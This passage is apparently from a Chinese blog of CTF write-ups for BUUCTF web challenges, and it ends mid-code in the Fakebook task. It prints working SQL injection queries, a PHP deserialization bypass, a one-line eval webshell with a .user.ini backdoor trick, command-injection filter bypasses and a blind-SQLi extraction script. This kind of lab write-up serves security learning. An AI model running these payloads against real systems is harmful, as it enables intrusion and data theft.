<p>这里用到了<code>nodeprep.prepare</code>函数，而nodeprep是从twisted模块中导入的<code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code>，在requirements.txt文件中，发现这里用到的twisted版本是<code>Twisted==10.2.0</code>，而官网最新版本为<code>19.2.0</code>(2019/6/2)，版本差距这么大，估计是存在什么漏洞，于是搜索一下<code>nodeprep.prepare</code>，找到一篇unicode安全的文章，<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpaper.tuisec.win%2Fdetail%2Fa9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p>
<p>这里原理就是利用nodeprep.prepare函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次nodeprep.prepare函数会把<code>A</code>转换成<code>a</code>。<br> 所以当我们用<code>ᴬdmin</code>注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成<code>Admin</code>，我们用<code>ᴬdmin</code>进行登录，可以看到index页面的username变成了<code>Admin</code>，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可（改一下密码重新登录）。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617180807334.png" alt="image-20200617180807334"></p>
<p>我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为<code>admin</code>，从而改掉<code>admin</code>的密码。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617180838843.png" alt="image-20200617180838843"></p>
<p>然后用<code>admin</code>和改的密码的登录，即可获取flag。</p>
<p>使用的是<code>admin</code>而不是<code>ᴬdmin</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617194252428.png" alt="image-20200617194252428"></p>
<p>还有两种解法，转自：<a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener">https://www.jianshu.com/p/f92311564ad0</a></p>
<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154326790.png" alt="image-20200619154326790"></p>
<p>题目已经提醒了是SQL注入，所以在用户名处进行注入，看看能否进行报错，说明存在SQL注入而且也是单引号出错的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154426285.png" alt="image-20200619154426285"></p>
<p>将后面加入注释符试试</p>
<p>发现返回了md5值，经过尝试发现无法解密，说明错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154519487.png" alt="image-20200619154519487"></p>
<p>直接在输入框没办法进行，在URL中试试，打开火狐使用hackbar当然也可以不用，只不过这样看的更直观而已</p>
<p>这样发现显示了不是之前的password而是显示了input。。。，这里可以猜测#不能使用，使用%23试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154853693.png" alt="image-20200619154853693"></p>
<p>使用%23之后发现页面返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155011435.png" alt="image-20200619155011435"></p>
<p>尽心测试注入字段，没有字段4，尝试一下字段3看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155036006.png" alt="image-20200619155036006"></p>
<p>发现字段3页面返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155229344.png" alt="image-20200619155229344"></p>
<p>查看注入点，username需要为错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155320193.png" alt="image-20200619155320193"></p>
<p>查看数据库</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155343358.png" alt="image-20200619155343358"></p>
<p>查看表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;geek&#39;%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155450550.png" alt="image-20200619155450550"></p>
<p>我们查询一下l0ve1ysq1这个表，发现返回了用户名和密码，看看有没有可用的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155629096.png" alt="image-20200619155629096"></p>
<p>将页面往后拉，发现出现了flag，复制提交即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&#39; union select 1,2,group_concat(username,password)from l0ve1ysq1%23&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155856927.png" alt="image-20200619155856927"></p>
<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>查看页面</p>
<p>根据题目的提示可以分析是信息泄露，我们使用dirsearch来扫描一下目录看看有没有什么敏感的目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620181135515.png" alt="image-20200620181135515"></p>
<p>这个我们在kali中安装一下dirsearch</p>
<p>安装很简单，直接在GitHub中下载，然后解压就可以</p>
<p>地址：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p>
<p>解压后进到dirsearch-master这个目录中，右键打开终端使用以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;dirsearch.py -u http:&#x2F;&#x2F;27f2f340-235e-47d8-8df9-f2a984334abe.node3.buuoj.cn -e php</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620182053874.png" alt="image-20200620182053874"></p>
<p>dirsearch参数介绍</p>
<p>-u    指定URL</p>
<p>-e    扫描网站语言</p>
<p>-w    可以加上自己的字典（带上路径）</p>
<p>-i    递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）</p>
<p>–random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）</p>
<p>我们这里就指定php来跑</p>
<p>跑完之后发现有一个<a href="http://www.zip的压缩包，有点可疑，在页面中访问一下" target="_blank" rel="noopener">www.zip的压缩包，有点可疑，在页面中访问一下</a></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620182353231.png" alt="image-20200620182353231"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;27f2f340-235e-47d8-8df9-f2a984334abe.node3.buuoj.cn&#x2F;www.zip</span><br></pre></td></tr></table></figure>

<p>访问上面链接之后会下载一个zip的文件，打开之后发现有三个php文件</p>
<p>分别是class.php、flag.php，index.php这三个php 文件，打开看看</p>
<p>index.php</p>
<p>查看index.php文件，这里只是筛选了php，还有一些HTML直接省略</p>
<p>这里可以看到包含了class.php文件和GET传参select的值，然后反序列化该值，接着看class.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在调用__destruct()的时候，username=admin，password=100的时候输出flag，因此我们 需要构造一个序列化，使得username=admin，password=100</p>
<p>可以将下面的代码复制到在线php执行或者复制到phpstudy的www目录下访问都可以，就会输出值</p>
<p>在线php网址：<a href="https://tool.lu/coderunner/" target="_blank" rel="noopener">https://tool.lu/coderunner/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 进行实例化</span><br><span class="line">$a &#x3D; new Name(&#39;admin&#39;, 100);</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620185451166.png" alt="image-20200620185451166"></p>
<p>复制将上面代码复制出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>其中name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()魔法函数。而且因为是private声明，我们需要在<strong>类名和字段名前面都会加上\0的前缀</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620184615544.png" alt="image-20200620184615544"></p>
<p><strong>PHP魔法函数</strong></p>
<p>php类中包含了一些魔法函数，这些函数可以再脚本的任何地方不用声明就可以使用</p>
<p>与php（反）序列化有关的魔法函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_construct()	&#x2F;&#x2F; 当一个对象创建时调用</span><br><span class="line">_destruct()		&#x2F;&#x2F; 当对象被销毁时触发</span><br><span class="line">_wakeup()		&#x2F;&#x2F; 使用unserialize时触发</span><br><span class="line">_sleep()		&#x2F;&#x2F; 使用serialize时触发</span><br><span class="line">_toString()		&#x2F;&#x2F; 把类当做字符串使用的时触发</span><br><span class="line">_get()			&#x2F;&#x2F; 用于从不可访问的属性读取数据</span><br><span class="line">————————————————————————————————————————————————</span><br><span class="line">_set()			&#x2F;&#x2F; 用于将数据写入不可访问的属性</span><br><span class="line">_isset()		&#x2F;&#x2F; 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">_unset()		&#x2F;&#x2F; 在不可访问的属性上使用unset()时触发</span><br><span class="line">_invoke()		&#x2F;&#x2F; 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>打开页面</p>
<p>是一个文件上传漏洞，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620222538324.png" alt="image-20200620222538324"></p>
<p>尝试一下上传一句话木马</p>
<p>返回了illegal suffix!，非法后缀，那么就上传图片码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620223047850.png" alt="image-20200620223047850"></p>
<p>将文件后缀改为图片后缀</p>
<p>返回了&lt;? in contents!，说明不能使用<code>&lt;?</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620223209799.png" alt="image-20200620223209799"></p>
<p>然后将内容伪造成<code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;123&#39;]);&lt;/script&gt;</code></p>
<p>返回了exif_imagetype:not image!，意思这个文件不是图像，这个简单伪造一个文件头就行，在文件头部加入GIF89a来进行伪造</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620224157308.png" alt="image-20200620224157308"></p>
<p>伪造之后进行提交，发现成功提交了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620224350841.png" alt="image-20200620224350841"></p>
<p>经过上面的错误可以得到以下几点内容</p>
<p>1、不能上传带有<code>&lt;?</code>的文件</p>
<p>2、上传文件必须含有图片头</p>
<p>经过以上两点内容，我们可以先上上传一个.user.ini进去，用来解析含有php代码的图片，即可达到绕过限制的目的</p>
<h5 id="介绍-user-ini"><a href="#介绍-user-ini" class="headerlink" title="介绍.user.ini"></a>介绍.user.ini</h5><p>.user.ini上传\隐藏后门</p>
<p>上传条件：</p>
<ul>
<li>服务器脚本语言为PHP</li>
<li>服务器使用CGI/FastCGI模式</li>
<li>上传目录下要有可执行的php文件</li>
</ul>
<p>两种参数介绍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a                  &#x2F;&#x2F;绕过exif_imagetype()</span><br><span class="line">auto_prepend_file&#x3D;a.jpg &#x2F;&#x2F;指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</span><br><span class="line">auto_append_file&#x3D;a.jpg  &#x2F;&#x2F;解析后进行包含</span><br></pre></td></tr></table></figure>

<p>优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx/apache/IIS都有效，而<code>.htaccess</code>只适用于apache</p>
<p>这里我们就构造.user.ini文件，内容是<code>auto_prepend_file=图片名称</code></p>
<p>这里我们的图片名称是123.jpg所以就要将.user.ini里的图片名称改为123.jpg</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225047364.png" alt="image-20200620225047364"></p>
<p>然后进行上传，返回了一个index.php文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225146776.png" alt="image-20200620225146776"></p>
<p>上传的地址，在后面加上index.php然后进行访问</p>
<p>url：<code>http://dc82f315-0e45-4911-9f8d-05bb8e8d0d23.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</code></p>
<p>页面返回了这个文件伪造的头部，这样说明成功了，如果出现错误，就例如页面打不开等，检查一下.user.ini和图片码中的代码结尾处是否有空格，图片码没试过，但是.user.ini如果你在内容的后面加空格的话，然后上传，是无法显示内容的，菜刀、蚁剑也连接不上</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225323155.png" alt="image-20200620225323155"></p>
<p>这样复制url在蚁剑中进行连接，打开蚁剑 ，右键空白处，点击添加数据，粘贴URL输入密码，然后测试连接，连接成功后，点击添加。完成后双击添加的数据即可进入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225802515.png" alt="image-20200620225802515"></p>
<p>在左上角目录列表处点击<code>/</code>，查看全部目录，将内容拉倒最底部，会发现一个flag文件，双击打开里面就是flag值，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225851432.png" alt="image-20200620225851432"></p>
<p>打开flag文件后显示以下内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225940707.png" alt="image-20200620225940707"></p>
<h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>打开页面</p>
<p>其实看到题目的时候应该就知道这个一个关于shell连接的题</p>
<p>看到内容已经给你答案了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230237557.png" alt="image-20200620230237557"></p>
<p>直接复制URL到菜刀或者蚁剑，密码页面已经给到了，就是Syc，连接即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230404458.png" alt="image-20200620230404458"></p>
<p>进入目录后还是点击<code>/</code>查看全部目录，然后拉到最后，找到flag文件，双击文件进去，就可以看到flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230449555.png" alt="image-20200620230449555"></p>
<p>复制flag提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230538643.png" alt="image-20200620230538643"></p>
<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>查看页面</p>
<p>看了看发现没有什么关注的点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621121654181.png" alt="image-20200621121654181"></p>
<p>使用burp抓包看看，将包发送到Repeater模块，审计一下源码。发现一个Secret.php，在URL中访问一下看看返回什么</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621122341875.png" alt="image-20200621122341875"></p>
<p>页面返回，<code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;</code>说不是从后面的网址访问的，这个一看就是要伪造Reperer</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123038660.png" alt="image-20200621123038660"></p>
<p>发现返回了，<code>Please use &quot;Syclover&quot; browser</code>，让其限制浏览器，伪造一下User-Agent，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123717787.png" alt="image-20200621123717787"></p>
<p>发现又返回说不是本地访问，在伪造一下X-Forwarded-For</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123849566.png" alt="image-20200621123849566"></p>
<p>伪造之后发现返回flag，左侧红线处是伪造的内容。复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621124040452.png" alt="image-20200621124040452"></p>
<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>查看页面</p>
<p>可以根据题目和网页内容可以看出这可以ping地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621161807677.png" alt="image-20200621161807677"></p>
<p>在URL构造一下试试，发现成功了。可以猜测这是命令执行</p>
<p>使用分号分隔，然后尝试ls命令看看能否列出文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621161914064.png" alt="image-20200621161914064"></p>
<p>发现使用ls后成功将文件列出来了。看到有flag文件，我们使用cat命令来查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621162103524.png" alt="image-20200621162103524"></p>
<p>发现提示非法空格，说明空格不能使用，这样就需要绕过空格</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621162147692.png" alt="image-20200621162147692"></p>
<p>绕过空格有一下几种内容</p>
<ul>
<li>%20、%09、$IFS、${IFS} 、$IFS$1、&lt; 、&lt;&gt; 、{cat,flag.php}</li>
</ul>
<p>这里经过测试发现$IFS$1可以使用，然后查看一下index.php文件</p>
<p>得到以下代码</p>
<p>可以看到过滤了&amp;，/，?，*，&lt;，&gt;，\x{00}-\x{1f}，‘，”，\，(，)，[，]，{，}，空格，bash，flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里可以使用变量拼接绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>

<p>页面返回正常的时候按F12查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621163343886.png" alt="image-20200621163343886"></p>
<p>发现flag就在源码中，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621163431390.png" alt="image-20200621163431390"></p>
<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>打开页面</p>
<p>发现有一个超链接，点击进去看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621233751090.png" alt="image-20200621233751090"></p>
<p>返回了<code>Can you find out the flag?</code>，但是发现URL中有<code>?file=flag.php</code>，第一反应就是用<code>php://input</code>伪协议</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621233900931.png" alt="image-20200621233900931"></p>
<p>使用<code>php://input</code>伪协议页面返回，发现被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234138692.png" alt="image-20200621234138692"></p>
<p>然后考虑一下是不是<code>php://filter</code>伪协议</p>
<p>尝试一下看看页面返回</p>
<p>Payload：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>页面返回了base64，复制解密一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234352974.png" alt="image-20200621234352974"></p>
<p>发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234442026.png" alt="image-20200621234442026"></p>
<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>打开页面</p>
<p>在登录框中输入数字看看返回什么东西</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165408704.png" alt="image-20200622165408704"></p>
<p>这里就先输入1，返回了Hello, glzjin wants a girlfriend.</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165624243.png" alt="image-20200622165624243"></p>
<p>输入2看看，返回了Do you want to be my girlfriend?，当输入3的时候页面返回了错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165641410.png" alt="image-20200622165641410"></p>
<p>这里就可以猜测是sql注入了，而且有两个字段，然后我们按照平常的姿势来注入，发现都不行，使用burpsuite抓包进行爆破，看看过滤了哪些字符，可以看到482长度的都是过滤了的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622171254105.png" alt="image-20200622171254105"></p>
<p>这样我们就可以使用异或来进行注入</p>
<p>这里的两个flag是因为页面上已经写上了</p>
<p>pyload：<code>0^(ascii(substr((select(flag)from(flag))1,1)&gt;1)</code></p>
<p>这样因为是盲注手注也行，但是太慢了，这里我们使用脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;29818d74-a256-4cfa-8521-0a24e85f886c.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line"># flag长度</span><br><span class="line">for x in range(1,50):</span><br><span class="line"># ascii常用字符</span><br><span class="line">    right&#x3D;137</span><br><span class="line">    left&#x3D;30</span><br><span class="line"># 二分法，去头去尾取中间</span><br><span class="line">    mid&#x3D;(right+left)&#x2F;&#x2F;2</span><br><span class="line"></span><br><span class="line">    while right &gt; left:</span><br><span class="line">        payload &#x3D; &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot; % (x, mid)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &quot;id&quot;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        resopnse&#x3D;requests.post(url,data&#x3D;data)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">       # 这里多行注释不能使用单引号，因为if的下面的Hello是单引号，这样就会导致报错</span><br><span class="line">		&quot;&quot;&quot;</span><br><span class="line">        Hello是因为当你输入1的时候返回的值</span><br><span class="line">        值能取逗号前或者逗号后的值，不能乱取。</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if &#39;Hello&#39; in resopnse.text:</span><br><span class="line">        # 每次最左侧都往又位移1次，如果不加1就会一直返回一个值</span><br><span class="line">            left&#x3D;mid+1</span><br><span class="line">        else:</span><br><span class="line">        # 因为二分法，最左侧就是中间位置。</span><br><span class="line">            right&#x3D;mid</span><br><span class="line">        mid&#x3D;(right+left)&#x2F;&#x2F;2</span><br><span class="line">    flag+&#x3D;chr(int(mid))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622173524051.png" alt="image-20200622173524051"></p>
<h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623105401888.png" alt="image-20200623105401888"></p>
<p>扫描一下目录</p>
<p>可以看到有一个robots.txt文件，在页面中打开看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623105918392.png" alt="image-20200623105918392"></p>
<p>页面有返回一个.bak后缀的文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623110015243.png" alt="image-20200623110015243"></p>
<p>先注册个账号，这是我注册好的，点击蓝色超链接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224005633.png" alt="image-20200622224005633"></p>
<p>在访问<code>/user.php.bak</code>看看下载下来一个.apk的文件，然后查看返回一下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();		&#x2F;&#x2F; 输出一个curl会话</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);	&#x2F;&#x2F; 设置需要抓取的URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);	&#x2F;&#x2F; 设置curl参数，要求结果保存到字符串中还是输出到屏幕上</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span 